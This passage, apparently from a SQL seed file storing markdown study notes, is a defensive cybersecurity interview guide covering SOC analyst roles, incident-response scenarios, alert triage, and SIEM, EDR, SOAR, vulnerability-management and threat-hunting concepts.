|----------------|-------------|
| **Monitoring** | Continuously monitor network traffic, system logs, and security alerts using SIEM and other tools |
| **Detection** | Analyze patterns and trends to recognize unauthorized access, malware, data breaches |
| **Incident Triage** | Determine severity of detected incidents, assess potential impact, prioritize response |
| **Investigation** | Conduct in-depth investigations using forensic techniques to understand incident scope |
| **Response** | Coordinate and implement response plans — isolate systems, apply patches, change access controls |
| **Reporting** | Prepare detailed incident reports documenting findings, actions, and recommendations |
| **Collaboration** | Work with IR teams, network admins, system admins, and management |
| **Threat Intelligence** | Monitor threat intelligence sources to proactively defend against emerging threats |
| **Continuous Improvement** | Participate in enhancing security measures, policies, and procedures |
| **Shift Work** | Many SOCs operate 24/7, requiring shift work including evenings and weekends |

### Security Analyst vs. Security Engineer

A common point of confusion is the difference between a Security Analyst and a Security Engineer. While they work closely together, their core functions differ significantly:

| Feature | Security Analyst | Security Engineer |
|---------|------------------|-------------------|
| **Core Focus** | Operations, Monitoring, and Response | Architecture, Implementation, and Maintenance |
| **Key Activities** | Triaging alerts, investigating incidents, analyzing malware, reporting | Designing security architectures, deploying SIEM/EDR tools, configuring firewalls, automating tasks |
| **Mindset** | Detective/Investigator (What happened and how do we stop it?) | Builder/Architect (How do we build a system to prevent this?) |
| **Relationship** | Identifies gaps in defenses and requests new controls | Implements the controls requested by the analysts |
| **Career Path** | Often starts at Tier 1 and progresses to Threat Hunter or Incident Responder | Often progresses to Security Architect or specialized engineering roles |

> **Analogy:** If a company is a castle, the **Security Engineer** builds the walls, installs the locks, and sets up the alarm system. The **Security Analyst** monitors the alarm system, patrols the walls, and responds when someone tries to break in.

---

## 3. SOC Analyst Tiers

| Tier | Role | Responsibilities |
|------|------|-----------------|
| **Tier 1 (L1)** | Alert Monitor / Triage Analyst | Monitor alerts, initial triage, determine if true/false positive, escalate to Tier 2 |
| **Tier 2 (L2)** | Incident Responder / Investigator | Deep-dive investigation, advanced analysis, containment, remediation |
| **Tier 3 (L3)** | Threat Hunter / Senior Analyst | Proactive threat hunting, advanced forensics, malware analysis, tool development |
| **SOC Manager** | Team Lead | Manage SOC operations, reporting, team development, strategy |

---

## 4. Entry-Level SOC Interview Q&A

### Q1: What is a SOC?
**A:** A SOC (Security Operations Center) is a centralized team responsible for monitoring, detecting, and responding to cybersecurity threats. It's the nerve center of an organization's security, using tools like SIEM, EDR, and IDS/IPS to maintain 24/7 vigilance. SOC analysts work in shifts to ensure around-the-clock monitoring and swift incident response.

### Q2: What is the difference between a security event and a security incident?
**A:** A security event is ANY observable occurrence — could be routine (user login) or significant (failed login). A security incident is an event that poses a REAL threat to CIA and requires investigation/response (data breach, malware, unauthorized access). Not all events are incidents; SOC analysts triage events to determine which are true incidents.

### Q3: What is threat intelligence?
**A:** Threat intelligence is the collection, analysis, and sharing of information about cyber threats. It includes data about attacker TTPs (tactics, techniques, procedures), IOCs (indicators of compromise), and emerging threats. Sources include open-source intelligence (OSINT), subscription services, government agencies, vendor feeds, and internal logs. It helps SOCs stay ahead of threats by providing context and actionable insights.

### Q4: What is a false positive vs a false negative?
**A:** A **false positive** is when a security tool flags something as malicious when it's actually benign — it wastes analyst time but doesn't miss a threat. A **false negative** is when a security tool FAILS to detect an actual threat — this is far more dangerous because a real attack goes unnoticed. SOC analysts must minimize both, but false negatives are the greater concern.

### Q5: What is the principle of least privilege?
**A:** Least privilege means granting users only the MINIMUM permissions necessary to perform their job functions — nothing more. It limits the blast radius if an account is compromised. Example: A marketing employee shouldn't have access to financial databases. Implemented through RBAC, regular access reviews, and just-in-time access.

### Q6: What are IOCs (Indicators of Compromise)?
**A:** IOCs are artifacts indicating a system may be compromised. Examples: malicious IP addresses, suspicious domain names, file hashes of known malware, unusual registry modifications, unexpected outbound connections, abnormal user behavior patterns. IOCs are used for detection, alerting, and threat hunting.

### Q7: What types of logs does a SOC monitor?
**A:** SOC monitors multiple log sources: **Firewall logs** (network traffic), **IDS/IPS logs** (intrusion attempts), **Authentication logs** (login success/failure), **Web proxy logs** (URL access), **Email gateway logs** (email threats), **Endpoint logs** (EDR/antivirus), **DNS logs** (domain queries), **Application logs** (application-specific events), and **Cloud logs** (cloud service activities).

### Q8: How do you handle alert fatigue?
**A:** Alert fatigue occurs when analysts are overwhelmed by too many alerts. Solutions: (1) Tune detection rules to reduce false positives, (2) Prioritize alerts by severity and business impact, (3) Automate low-level alert handling with SOAR playbooks, (4) Implement alert correlation to group related alerts, (5) Regular review and optimization of detection rules, (6) Proper shift scheduling to prevent burnout.

### Q9: What is a SIEM and how does it work?
**A:** SIEM (Security Information and Event Management) collects, aggregates, and correlates log data from multiple sources across the organization. It provides real-time monitoring, alerting, and reporting. It works by: collecting logs → normalizing data → correlating events using rules → generating alerts → providing dashboards for investigation. Examples: Splunk, IBM QRadar, Microsoft Sentinel.

### Q10: What is network segmentation and why is it important?
**A:** Network segmentation divides a network into smaller, isolated segments using VLANs, subnets, or firewalls. It's important because it limits lateral movement — if an attacker compromises one segment, they can't easily reach others. It also helps with compliance (isolating PCI data), performance optimization, and reducing the attack surface.

---

## 5. Scenario-Based SOC Questions

### Scenario 1: Suspicious Outbound Traffic at 2 AM
**Situation:** You're monitoring logs at 2 AM. You spot large data transfers from a workstation to an unknown external IP. The user logged out at 6 PM.

**Response:**
1. **Immediate Isolation** — Pull the machine off the network to stop data leakage
2. **Evidence Preservation** — Capture forensic image before making any changes
3. **Traffic Analysis** — Analyze logs: what was sent? Check IP reputation (threat intel)
4. **Escalation** — Alert IR team and management immediately
5. **Deep Investigation** — Look for malware, review user activity history, build timeline
6. **Determine attack vector** — Phishing? Exploit? Compromised credentials?

---

### Scenario 2: Mass Phishing Campaign
**Situation:** Monday morning, multiple employees report suspicious emails from "IT" asking to verify credentials. Three employees already clicked and entered passwords.

**Response:**
1. **Block** the malicious domain/URL at firewall and email gateway
2. **Force password reset** for the three compromised users immediately
3. **Email analysis** — Check headers, links, attachments for IOCs
4. **Threat hunting** — Search across the org for similar emails and other compromised accounts
5. **User awareness** — Send security alert reminding employees how to spot phishing

---

### Scenario 3: Endpoint Malware Alert on Finance Server
**Situation:** Your EDR lights up with a red alert — suspicious process execution and registry modifications on a critical finance server.

**Response:**
1. **System isolation** — Isolate the server, but coordinate with finance (business continuity)
2. **Malware analysis** — Analyze process behavior, grab file hashes, check network connections
3. **Impact assessment** — Was sensitive financial data accessed? Any lateral movement?
4. **Artifact collection** — Memory dumps, disk images, logs (preserve evidence)
5. **Remediation** — Clean infection, patch vulnerabilities, restore from clean backup
6. **Document everything** for the incident report

---

### Scenario 4: Brute Force Attack
**Situation:** Thousands of failed login attempts across multiple accounts in the past hour. Some accounts are already locked out.

**Response:**
1. **IP blocking** — Block malicious IP/ranges at firewall/proxy
2. **Pattern analysis** — Are they targeting specific accounts? Single region or global?
3. **Account security** — Check if any login actually SUCCEEDED (bigger problem)
4. **Enhanced monitoring** — Increase logging on authentication systems
5. **Long-term countermeasures** — Recommend rate limiting, CAPTCHA, and MFA

---

### Scenario 5: Insider Threat
**Situation:** Employee with negative performance review starts accessing systems outside their role, logging in at odd hours, copying large amounts of data.

**Response:**
1. **Discrete monitoring** — Quietly increase logging (don't alert the individual)
2. **Activity analysis** — Compare access patterns to normal job responsibilities
3. **HR coordination** — Loop in HR and legal early, keep confidential
4. **Evidence collection** — Document every login, file copy, timestamp
5. **Preventive measures** — Restrict access, apply least privilege, or disable account if needed
6. **Balance security with fairness** — Not all unusual activity is malicious

---

### Scenario 6: DDoS Attack
**Situation:** Website crawling, customers complaining, massive traffic spike from distributed sources.

**Response:**
1. **Activate DDoS mitigation** (Cloudflare, AWS Shield, etc.)
2. **Traffic analysis** — Identify vectors (HTTP flood? SYN flood?)
3. **ISP coordination** — Contact ISP for upstream filtering
4. **Service prioritization** — If resources are limited, keep critical services running
5. **Post-attack review** — Analyze attack patterns, update mitigation plan

---

### Scenario 7: Ransomware Detected
**Situation:** Multiple endpoints showing encrypted files with ransom notes demanding Bitcoin payment.

**Response:**
1. **Immediate network isolation** of affected systems
2. **Identify ransomware variant** (check file extensions, ransom note)
3. **Check for available decryptors** (No More Ransom project)
4. **Do NOT pay the ransom** — no guarantee of decryption
5. **Assess scope** — How many systems affected? What data encrypted?
6. **Restore from clean backups** after verification
7. **Investigate entry point** — phishing? RDP exposure? Vulnerability?
8. **Notify management and potentially law enforcement**
9. **Patch and harden systems** before bringing back online

---

### Scenario 8: Data Exfiltration & DLP Alert
**Situation:** DLP system alerts that a user is attempting to upload sensitive company files to a personal cloud storage service.

**Response:**
1. **Block the upload** immediately via DLP policy
2. **Identify the user** and the data being transferred
3. **Assess the data classification** — how sensitive is it?
4. **Check if data was successfully transferred** before blocking
5. **Investigate intent** — accidental or deliberate?
6. **Coordinate with HR/Legal** if intentional
7. **Review and strengthen DLP policies**
8. **Reinforce data handling training**

---

## 6. Alert Triage & Investigation Process

### The Triage Workflow

```
Alert Generated → Initial Assessment → Classify (True/False Positive) 
    → If True Positive: Investigate → Contain → Escalate if needed → Remediate → Document
    → If False Positive: Tune rule → Document → Close
```

### Investigation Steps for Any Alert

| Step | Action | Tools |
|------|--------|-------|
| 1 | **Read the alert** — understand what triggered it | SIEM dashboard |
| 2 | **Check source/destination** — who/what is involved? | SIEM, EDR |
| 3 | **Reputation check** — is the IP/domain/hash known malicious? | VirusTotal, AbuseIPDB, threat intel |
| 4 | **Correlate events** — any related alerts or events? | SIEM correlation |
| 5 | **Check user context** — is this normal for this user? | UBA/UEBA, HR directory |
| 6 | **Review logs** — detailed log analysis | SIEM, raw logs |
| 7 | **Determine verdict** — true positive, false positive, or benign true positive | Analyst judgment |
| 8 | **Respond** — take appropriate action | Playbook/runbook |
| 9 | **Document** — record findings and actions | Ticketing system |
| 10 | **Escalate if needed** — hand off to Tier 2/3 or IR | Escalation procedure |

---

## 7. Threat Intelligence in the SOC

### Types of Threat Intelligence

| Type | Description | Audience |
|------|-------------|----------|
| **Strategic** | High-level trends, motivations, and risks | Executives, management |
| **Tactical** | TTPs (Tactics, Techniques, Procedures) of threat actors | Security team, SOC |
| **Operational** | Details about specific attacks (who, what, when) | IR team, SOC |
| **Technical** | IOCs — IPs, domains, file hashes, URLs | SOC analysts, SIEM rules |

### Threat Intelligence Sources
- **Open Source (OSINT)** — Public feeds, blogs, social media, vendor reports
- **Subscription Services** — Commercial threat intel platforms (Recorded Future, Mandiant)
- **Government** — CISA, FBI, NSA advisories
- **Industry Sharing** — ISACs (Information Sharing and Analysis Centers)
- **Internal** — Own SIEM logs, incident history, honeypots
- **Dark Web Monitoring** — Monitor for leaked credentials, attack planning

---

## 8. Key SOC Tools & Technologies

| Tool Category | Purpose | Examples |
|--------------|---------|---------|
| **SIEM** | Log aggregation, correlation, alerting | Splunk, QRadar, Microsoft Sentinel, ArcSight |
| **EDR** | Endpoint detection and response | CrowdStrike, Carbon Black, Defender for Endpoint |
| **SOAR** | Security orchestration and automation | Phantom, Demisto (XSOAR), Swimlane |
| **IDS/IPS** | Network intrusion detection/prevention | Snort, Suricata, Zeek |
| **Firewall** | Network traffic control | Palo Alto, Fortinet, Cisco ASA |
| **Threat Intel** | IOC feeds and research | VirusTotal, AbuseIPDB, MISP, AlienVault OTX |
| **Ticketing** | Incident tracking | ServiceNow, Jira, TheHive |
| **Network Analysis** | Traffic analysis | Wireshark, tcpdump, Zeek |
| **Vulnerability Scanner** | Vulnerability identification | Nessus, Qualys, Rapid7 |
| **Email Security** | Email protection | Proofpoint, Mimecast, Microsoft Defender for O365 |

---

## 9. Quick Reference Tables

### SOC Alert Severity Levels

| Severity | Response | Example |
|----------|----------|---------|
| **Critical (P1)** | Immediate — all hands | Active data breach, ransomware spread |
| **High (P2)** | Within 1 hour | Compromised admin credentials, C2 communication |
| **Medium (P3)** | Within 4 hours | Malware on single endpoint, policy violation |
| **Low (P4)** | Within 24 hours | Phishing attempt (no click), minor policy breach |
| **Informational** | Review when possible | Routine scan, info gathering |

### Common Interview Scenario Responses — Quick Framework

```
For ANY scenario, follow this structure:
1. ASSESS — What's happening? How severe?
2. CONTAIN — Stop the spread immediately
3. INVESTIGATE — Gather evidence, analyze
4. REMEDIATE — Remove the threat, fix root cause
5. COMMUNICATE — Escalate and report
6. LEARN — Document lessons, improve
```

### SOC Daily Activities

| Time | Activity |
|------|----------|
| Shift Start | Review handoff notes, check pending incidents |
| Ongoing | Monitor SIEM dashboard, triage new alerts |
| As Needed | Investigate escalated alerts, conduct threat hunting |
| Regular | Update IOC feeds, review false positive rates |
| Shift End | Prepare handoff notes for next shift |

---

## 10. Key Takeaways

1. ✅ **SOC = Security Operations Center** — centralized monitoring, detection, response
2. ✅ **Tier 1** = Monitor & Triage | **Tier 2** = Investigate & Respond | **Tier 3** = Hunt & Analyze
3. ✅ **Event ≠ Incident** — analysts triage events to identify true incidents
4. ✅ **Threat intelligence** helps SOCs stay proactive with attacker TTPs and IOCs
5. ✅ For ANY scenario: **Assess → Contain → Investigate → Remediate → Communicate → Learn**
6. ✅ **False positive** = benign flagged as malicious | **False negative** = malicious missed (WORSE)
7. ✅ **Never pay ransomware** — restore from backups, notify law enforcement
8. ✅ **Insider threats** require discrete monitoring + HR/Legal coordination
9. ✅ Key tools: **SIEM** (Splunk), **EDR** (CrowdStrike), **SOAR** (automation), **Threat Intel** (VirusTotal)
10. ✅ **Document everything** — every incident needs a paper trail

---

> 📌 **Previous:** [Part 5: Incident Response & DFIR](./Study_Guide_Part5_Incident_Response_DFIR.md)  
> 📌 **Next:** [Part 7: Security Tools — SIEM, EDR, SOAR](./Study_Guide_Part7_Security_Tools_SIEM_EDR_SOAR.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part7_Security_Tools_SIEM_EDR_SOAR$VELSEC$, $VELSEC$Study Guide Part7 Security Tools Siem Edr Soar$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 7: Security Tools — SIEM, EDR, SOAR, Endpoint Security, Vulnerability Management & Threat Hunting

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: SIEM, EDR, SOAR, Endpoint Security, Microsoft Defender, Vulnerability Management, Threat Hunting

---

## Table of Contents

1. [SIEM — Security Information & Event Management](#1-siem--security-information--event-management)
2. [EDR — Endpoint Detection & Response](#2-edr--endpoint-detection--response)
3. [SOAR — Security Orchestration, Automation & Response](#3-soar--security-orchestration-automation--response)
4. [Endpoint Security](#4-endpoint-security)
5. [Microsoft Defender for Endpoint](#5-microsoft-defender-for-endpoint)
6. [Vulnerability Management](#6-vulnerability-management)
7. [Threat Hunting](#7-threat-hunting)
8. [Interview Questions & Answers](#8-interview-questions--answers)
9. [Quick Reference Tables](#9-quick-reference-tables)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. SIEM — Security Information & Event Management

### What is SIEM?
A SIEM is a security solution that **collects, aggregates, normalizes, correlates, and analyzes** log and event data from multiple sources across an organization's IT infrastructure to provide **real-time monitoring, alerting, and reporting**.

### SIEM Architecture & Components

| Component | Function |
|-----------|----------|
| **Log Collection** | Gathers logs from firewalls, servers, endpoints, applications, cloud services |
| **Normalization** | Converts different log formats into a standard format for analysis |
| **Correlation Engine** | Applies rules to correlate events across sources and detect threats |
| **Alerting** | Generates alerts based on correlation rules and thresholds |
| **Dashboard** | Visual display of security posture, alerts, and metrics |
| **Reporting** | Generates compliance and incident reports |
| **Storage** | Retains logs for historical analysis and compliance |
| **Forensic Analysis** | Enables deep-dive investigation into past events |

### Common SIEM Log Sources

| Source | What It Captures |
|--------|-----------------|
| **Firewalls** | Network traffic (allowed/denied), connection attempts |
| **IDS/IPS** | Intrusion detection alerts, blocked attacks |
| **Active Directory** | User authentication, account changes, group modifications |
| **Web Proxies** | URL access, web traffic, content filtering |
| **Email Gateways** | Email threats, spam, phishing attempts |
| **Endpoints (EDR)** | Process execution, file changes, registry modifications |
| **DNS Servers** | Domain queries, potential DNS tunneling |
| **VPN** | Remote access connections, authentication |
| **Cloud Services** | API calls, resource changes, access logs |
| **Applications** | Application-specific events, errors, access |

### SIEM Correlation Rules
- **Threshold-based:** Alert if 10+ failed logins in 5 minutes from same IP
- **Sequence-based:** Alert if port scan → vulnerability exploit → privilege escalation
- **Anomaly-based:** Alert if user downloads 10x more data than normal
- **Behavioral:** Alert if admin account logs in at unusual hours from unusual location

### SIEM Use Cases
1. **Brute force detection** — Multiple failed logins followed by success
2. **Lateral movement** — Sequential logins across multiple systems
3. **Data exfiltration** — Unusual outbound data transfers
4. **Privilege escalation** — User gaining admin rights unexpectedly
5. **Malware C2** — Periodic beaconing to external IPs
6. **Compliance reporting** — PCI-DSS, HIPAA, SOX audit logs

### Popular SIEM Solutions
- **Splunk** — Most widely used, powerful query language (SPL)
- **IBM QRadar** — Strong correlation engine, offense management
- **Microsoft Sentinel** — Cloud-native, Azure integration
- **ArcSight** — Enterprise-grade, older platform
- **LogRhythm** — SIEM + SOAR combined
- **Elastic SIEM** — Open-source based on ELK stack

---

## 2. EDR — Endpoint Detection & Response

### What is EDR?
EDR solutions continuously **monitor endpoint activities**, **detect suspicious behavior**, and provide **automated response capabilities** to contain threats at the endpoint level.

### Key EDR Features

| Feature | Description |
|---------|-------------|
| **Continuous Monitoring** | Records all endpoint activity (processes, files, registry, network) |
| **Threat Detection** | Behavioral analysis, ML-based detection, signature matching |
| **Automated Response** | Auto-isolate endpoints, kill processes, quarantine files |
| **Investigation** | Timeline view of endpoint activity for forensic analysis |
| **Threat Intelligence** | Integration with IOC feeds for known threat detection |
| **Remediation** | Remote remediation — clean, restore, patch endpoints |

### EDR vs Traditional Antivirus

| Feature | Traditional AV | EDR |
|---------|---------------|-----|
| **Detection Method** | Signature-based (known threats) | Behavioral + signature + ML |
| **Unknown Threats** | ❌ Limited | ✅ Detects via behavior analysis |
| **Visibility** | Limited to file scanning | Full endpoint telemetry |
| **Response** | Block/quarantine files | Isolate endpoint, kill process, remediate |
| **Investigation** | Minimal | Full timeline and forensic capability |
| **Automation** | Basic | Advanced playbooks and automated response |
| **Fileless Malware** | ❌ Cannot detect | ✅ Detects via process monitoring |

### EDR Incident Lifecycle
```
Detection → Alert → Investigation → Containment → Remediation → Recovery → Lessons Learned
```

### EDR Privacy & Compliance Considerations
- EDR agents collect extensive endpoint data — must comply with privacy regulations
- Data collection scope should be documented and communicated
- Data retention policies must align with regulations (GDPR, HIPAA)
- Access to EDR data should be restricted to authorized personnel
- Regular audits of EDR data access and usage

### Popular EDR Solutions
- **CrowdStrike Falcon** — Cloud-native, lightweight agent
- **Microsoft Defender for Endpoint** — Integrated with Microsoft ecosystem
- **Carbon Black (VMware)** — Strong behavioral detection
- **SentinelOne** — AI-powered autonomous response
- **Cortex XDR (Palo Alto)** — Extended detection across endpoints and network

---

## 3. SOAR — Security Orchestration, Automation & Response

### What is SOAR?
SOAR platforms **automate security operations**, **orchestrate tools**, and **streamline incident response** through predefined playbooks and workflows.

### The Three Pillars of SOAR

| Pillar | Description |
|--------|-------------|
| **Orchestration** | Connects and coordinates multiple security tools (SIEM, EDR, firewall, threat intel) into unified workflows |
| **Automation** | Automates repetitive, manual tasks (IOC enrichment, alert triage, ticket creation) |
| **Response** | Provides standardized, consistent incident response through playbooks |

### SOAR Playbook Examples

#### Phishing Response Playbook
```
1. Alert received from email gateway
2. AUTO: Extract URLs, attachments, sender info
3. AUTO: Check IOCs against threat intel (VirusTotal, AbuseIPDB)
4. AUTO: If malicious → block sender domain at email gateway
5. AUTO: Search for same email across all mailboxes
6. AUTO: Delete malicious emails from all inboxes
7. MANUAL: Notify affected users
8. AUTO: Create incident ticket with all findings
9. AUTO: Update IOC blocklists
```

#### Malware Alert Playbook
```
1. EDR alert received
2. AUTO: Gather endpoint details (hostname, user, process)
3. AUTO: Check file hash against threat intel
4. AUTO: If confirmed malicious → isolate endpoint
5. AUTO: Collect forensic artifacts
6. MANUAL: Analyst reviews and approves remediation
7. AUTO: Clean malware, restore clean state
8. AUTO: Generate incident report
```

### SOAR Benefits
- **Reduces response time** — from hours to minutes
- **Consistency** — standardized responses via playbooks
- **Efficiency** — automates repetitive tasks (80% of alerts)
- **Scalability** — handle more alerts with same team size
- **Integration** — connects all security tools into one platform
- **Metrics** — tracks MTTD, MTTR, analyst efficiency

### Popular SOAR Solutions
- **Palo Alto Cortex XSOAR (Demisto)** — Market leader
- **Splunk Phantom** — Deep Splunk integration
- **Swimlane** — Low-code automation
- **IBM Resilient** — IBM QRadar integration
- **ServiceNow SecOps** — IT service management integration

---

## 4. Endpoint Security

### What is Endpoint Security?
The practice of **securing all endpoints** (laptops, desktops, mobile devices, servers) that connect to an organization's network from cybersecurity threats.

### Key Endpoint Security Components

| Component | Function |
|-----------|----------|
| **Antivirus/Anti-malware** | Detect and remove known malware |
| **EDR** | Advanced endpoint monitoring and response |
| **Host-based Firewall** | Control inbound/outbound traffic at host level |
| **DLP (Data Loss Prevention)** | Prevent unauthorized data transfers |
| **Encryption** | Full disk encryption (BitLocker, FileVault) |
| **Patch Management** | Keep OS and applications updated |
| **Application Control** | Whitelist/blacklist applications |
| **MDM (Mobile Device Management)** | Manage and secure mobile devices |

### BYOD (Bring Your Own Device) Policy
- Personal devices accessing corporate resources create security risks
- BYOD policies should define: acceptable use, security requirements, monitoring scope
- Solutions: MDM, containerization (separate work/personal data), VPN requirement
- Challenges: Privacy concerns, diverse device types, limited control

### Endpoint Non-Compliance Remediation
1. **Identify** non-compliant endpoints through automated scanning
2. **Notify** the user about compliance requirements
3. **Quarantine** the device from sensitive resources
4. **Remediate** — install updates, apply configurations
5. **Verify** compliance before restoring full access
6. **Document** and track compliance status

### APT (Advanced Persistent Threat) Defense at Endpoints
- Deploy EDR with behavioral analysis
- Implement application whitelisting
- Use micro-segmentation to limit lateral movement
- Monitor for fileless attack indicators
- Regular threat hunting on endpoints
- Employee awareness training (phishing is primary APT entry vector)

---

## 5. Microsoft Defender for Endpoint

### Key Features
| Feature | Description |
|---------|-------------|
| **Threat & Vulnerability Management** | Discover vulnerabilities and misconfigurations on endpoints |
| **Attack Surface Reduction (ASR)** | Rules to reduce the attack surface (block Office macros, script execution) |
| **Next-Gen Protection** | Cloud-delivered protection, behavioral analysis, ML-based detection |
| **EDR** | Real-time monitoring, investigation, automated response |
| **Auto Investigation & Remediation** | AI-powered automated investigation and remediation |
| **Threat Analytics** | Real-time threat intelligence and exposure assessment |
| **Microsoft Secure Score** | Security posture scoring and recommendations |

### Integration with Microsoft Ecosystem
- **Microsoft 365 Defender** — Unified security across endpoints, email, identity, apps
- **Microsoft Sentinel** — Cloud SIEM integration
- **Azure AD** — Identity-based threat detection
- **Intune** — Device compliance and MDM

---

## 6. Vulnerability Management

### What is Vulnerability Management?
A **continuous process** of identifying, classifying, prioritizing, remediating, and mitigating security vulnerabilities in systems and software.

### Vulnerability Management Lifecycle

```
Discover → Assess → Prioritize → Remediate → Verify → Report → (Repeat)
```

### Key Stages

| Stage | Description |
|-------|-------------|
| **Discovery/Inventory** | Identify all assets (hardware, software, cloud resources) |
| **Vulnerability Scanning** | Automated scanning using tools (Nessus, Qualys, Rapid7) |
| **Assessment** | Analyze scan results, validate findings, eliminate false positives |
| **Prioritization** | Rank vulnerabilities by CVSS score, exploitability, business impact |
| **Remediation** | Patch, reconfigure, or apply compensating controls |
| **Verification** | Re-scan to confirm vulnerability is resolved |
| **Reporting** | Generate reports for management, compliance, and tracking |

### CVSS (Common Vulnerability Scoring System)

| Score Range | Severity | Priority |
|-------------|----------|----------|
| 0.0 | None | Informational |
| 0.1–3.9 | Low | Schedule fix |
| 4.0–6.9 | Medium | Fix within 30 days |
| 7.0–8.9 | High | Fix within 7 days |
| 9.0–10.0 | Critical | Fix immediately |

### Vulnerability vs Patch Management
- **Vulnerability Management** = Identifying, assessing, and prioritizing vulnerabilities
- **Patch Management** = Applying fixes (patches) to address vulnerabilities
- Patch management is ONE remediation method within vulnerability management

### Common Vulnerability Scanning Tools
- **Nessus** (Tenable) — Industry standard, comprehensive scanning
- **Qualys** — Cloud-based, continuous monitoring
- **Rapid7 InsightVM** — Risk-based prioritization
- **OpenVAS** — Open-source vulnerability scanner
- **Microsoft Defender TVM** — Integrated with Defender for Endpoint

---

## 7. Threat Hunting

### What is Threat Hunting?
**Proactive** security activity where analysts actively search for threats that have **bypassed existing security controls**. Unlike monitoring (reactive), threat hunting is hypothesis-driven and assumes threats are already present.

### Threat Hunting vs Monitoring

| Aspect | Monitoring (Reactive) | Threat Hunting (Proactive) |
|--------|----------------------|---------------------------|
| **Approach** | Wait for alerts | Actively search for threats |
| **Assumption** | Tools will detect threats | Some threats bypass tools |
| **Trigger** | Alert-driven | Hypothesis-driven |
| **Role** | SOC Tier 1/2 | SOC Tier 3, specialized hunters |
| **Data** | Alert data | Full telemetry, logs, threat intel |

### Threat Hunting Process

```
1. Hypothesis Formation → 2. Data Collection → 3. Investigation → 4. Pattern Discovery → 5. Response/Remediation
```

#### Step 1: Hypothesis Formation
- Based on: threat intelligence, industry reports, MITRE ATT&CK, known TTPs
- Example: "Attackers may be using PowerShell for lateral movement in our environment"

#### Step 2: Data Collection
- Gather relevant data: SIEM logs, EDR telemetry, network traffic, DNS logs
- Focus on data related to the hypothesis

#### Step 3: Investigation
- Analyze collected data for anomalies, patterns, and IOCs
- Use statistical analysis, visualization, and correlation

#### Step 4: Pattern Discovery
- Identify confirmed threats, suspicious behaviors, or new IOCs
- Document findings and map to MITRE ATT&CK

#### Step 5: Response/Remediation
- If threat found: escalate to IR, contain and remediate
- If no threat: document hypothesis and results for future reference
- Update detection rules to catch similar activity automatically

### Threat Hunting Techniques

| Technique | Description |
|-----------|-------------|
| **IOC-based** | Search for known indicators (IPs, hashes, domains) |
| **TTP-based** | Search for behaviors mapped to MITRE ATT&CK |
| **Anomaly-based** | Look for deviations from normal baseline behavior |
| **Intelligence-driven** | Hunt based on specific threat intelligence reports |
| **Situational** | Hunt based on organizational events (merger, vulnerability disclosure) |

### Threat Hunting Tools
- **SIEM** (Splunk, Sentinel) — Query and analyze logs
- **EDR** (CrowdStrike, Defender) — Endpoint telemetry queries
- **YARA** — Create rules to identify malware samples
- **Sigma** — Generic signature format for SIEM rules
- **MITRE ATT&CK Navigator** — Visualize coverage gaps
- **Jupyter Notebooks** — Data analysis and visualization

---

## 8. Interview Questions & Answers

### Q1: What is the difference between SIEM and EDR?
**A:** SIEM collects and correlates LOGS from multiple sources across the entire infrastructure for centralized monitoring and alerting. EDR monitors ENDPOINT ACTIVITIES specifically (processes, files, registry, network connections) and provides automated response at the endpoint. SIEM gives you the big picture; EDR gives deep endpoint visibility. They complement each other — EDR feeds data into SIEM.

### Q2: What is SOAR and how does it differ from SIEM?
**A:** SIEM detects threats by correlating logs and generating alerts. SOAR automates the RESPONSE to those alerts through playbooks and workflows. SIEM tells you something happened; SOAR helps you respond faster. SOAR also orchestrates multiple security tools (SIEM, EDR, firewall, threat intel) into unified automated workflows.

### Q3: What are SIEM correlation rules?
**A:** Correlation rules are logic-based rules that connect multiple events to identify threats. Types include: threshold-based (10+ failed logins in 5 minutes), sequence-based (port scan followed by exploit), anomaly-based (unusual data transfer volume), and behavioral (admin login at unusual time from unusual location). Effective rules reduce false positives while catching real threats.

### Q4: What is the CVSS score and how do you use it?
**A:** CVSS (Common Vulnerability Scoring System) rates vulnerabilities on a scale of 0-10: Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0). I use it for prioritization — critical vulnerabilities get remediated immediately, while lower scores are scheduled. However, CVSS alone isn't enough — I also consider exploitability, business impact, and asset criticality.

### Q5: Explain the difference between EDR and traditional antivirus.
**A:** Traditional AV uses signature-based detection (known threats only) and can only block/quarantine files. EDR uses behavioral analysis and ML to detect UNKNOWN threats including fileless malware, provides full endpoint telemetry for investigation, can isolate endpoints remotely, and offers automated response playbooks. EDR is the evolution of AV for modern threats.

### Q6: What is threat hunting and how does it differ from SOC monitoring?
**A:** SOC monitoring is REACTIVE — waiting for alerts from SIEM/EDR. Threat hunting is PROACTIVE — actively searching for threats that may have bypassed security controls. Hunting is hypothesis-driven, using MITRE ATT&CK and threat intelligence. Hunters analyze full telemetry data, not just alerts. It's typically done by Tier 3 analysts.

### Q7: What is the vulnerability management lifecycle?
**A:** Discover (asset inventory) → Scan (automated vulnerability scanning) → Assess (validate findings, eliminate false positives) → Prioritize (CVSS score + business impact) → Remediate (patch, reconfigure, or apply compensating controls) → Verify (re-scan to confirm fix) → Report (management and compliance reporting). It's a continuous cycle.

### Q8: What are SOAR playbooks?
**A:** Playbooks are predefined, automated workflows that define step-by-step responses to specific incident types. Example: Phishing playbook automatically extracts IOCs, checks threat intel, blocks malicious domains, searches for similar emails across the org, notifies affected users, and creates an incident ticket. They ensure consistent, fast response and reduce manual work.

### Q9: How do you prioritize vulnerabilities for remediation?
**A:** I use a risk-based approach: (1) CVSS score as a starting point, (2) Is there a known exploit in the wild? (3) Is the asset internet-facing or internal? (4) What's the business impact if compromised? (5) What data does the system process? (6) Are there compensating controls? Critical, internet-facing systems with known exploits get patched first.

### Q10: What is BYOD and what security challenges does it create?
**A:** BYOD (Bring Your Own Device) allows employees to use personal devices for work. Challenges: limited control over device security, diverse OS/device types, personal apps with vulnerabilities, data leakage risk, privacy concerns for monitoring. Solutions: MDM for policy enforcement, containerization to separate work/personal data, VPN requirement, network segmentation for BYOD devices.

---

## 9. Quick Reference Tables

### SIEM vs EDR vs SOAR

